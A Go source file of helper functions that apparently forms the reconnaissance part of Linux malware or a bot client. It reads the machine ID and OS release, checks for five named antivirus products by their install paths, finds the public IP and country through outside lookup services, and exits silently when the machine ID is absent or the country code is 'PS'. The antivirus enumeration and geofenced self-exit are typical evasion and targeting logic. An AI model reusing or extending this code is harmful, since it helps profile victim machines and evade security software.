package miscs

import (
	"bufio"
	"bytes"
	"io"
	"net/http"
	"os"
	"strings"
)

func GetMachineID() string {
	const machineIDFilePath = "/etc/machine-id"

	file, err := os.Open(machineIDFilePath)
	if err != nil {
		os.Exit(0)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		line := scanner.Text()
		return strings.TrimSpace(line)
	}

	if err := scanner.Err(); err != nil {
		os.Exit(0)
	}
	os.Exit(0)
	return "This should always return?"
}

func GetLinuxDistribution() string {
	file, err := os.Open("/etc/os-release")
	if err != nil {
		return "other"
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			return strings.Trim(line[len("PRETTY_NAME="):], "\"")
		}
	}

	if err := scanner.Err(); err != nil {
		return "other"
	}

	return "other"
}

type Antivirus struct {
	Name string
	Path string
}

var knownAntiviruses = []Antivirus{
	{"ClamAV", "/usr/bin/clamscan"},
	{"ESET NOD32", "/opt/eset/efs/sbin/odscan"},
	{"Sophos", "/opt/sophos-av/bin/savscan"},
	{"Kaspersky", "/opt/kaspersky/kesl/bin/kesl-control"},
	{"Bitdefender", "/opt/BitDefender-scanner/bin/bdscan"},
}

func GetAntivirus() string {
	for _, av := range knownAntiviruses {
		if _, err := os.Stat(av.Path); !os.IsNotExist(err) {
			return av.Name
		}
	}
	return "none"
}

func GetClientIP() string {
	rsp, _ := http.Get("https://checkip.amazonaws.com/")
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := io.ReadAll(rsp.Body)
		return string(bytes.TrimSpace(buf))
	}
	return "1.1.1.1"
}

func GetNation() string {
	rsp, err := http.Get("http://ip-api.com/line/" + GetClientIP() + "?fields=countryCode")
	if err != nil {
		return "N/A"
	}
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := io.ReadAll(rsp.Body)
		if string(buf) == "PS" {
			os.Exit(0)
		}
		return string(bytes.TrimSpace(buf))
	}
	return "N/A"
}
